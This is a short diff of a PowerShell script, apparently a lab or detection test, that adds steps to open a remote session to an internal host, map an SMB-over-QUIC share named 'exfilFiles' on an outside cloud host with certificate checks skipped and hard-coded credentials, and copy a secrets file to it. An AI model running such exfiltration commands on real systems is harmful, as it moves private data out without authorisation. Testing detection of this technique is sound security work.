@@ -15,6 +15,14 @@ New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\ex
 # Copy temp file to remote share
 copy 'C:\Temp\super-secret-db.db' 'Z:\'
 
+# Connect to remote device
+Enter-PSSession 10.10.10.91
+# Create new file share link
+New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
+# Copy temp file to remote share
+copy 'C:\Temp\secret-data.txt' 'Z:\'
+# Exit remote device
+Exit-PSSession
 
 # Prevent the PowerShell window from closing immediately - for visibility in testing
 Read-Host -Prompt "Press Enter to exit"
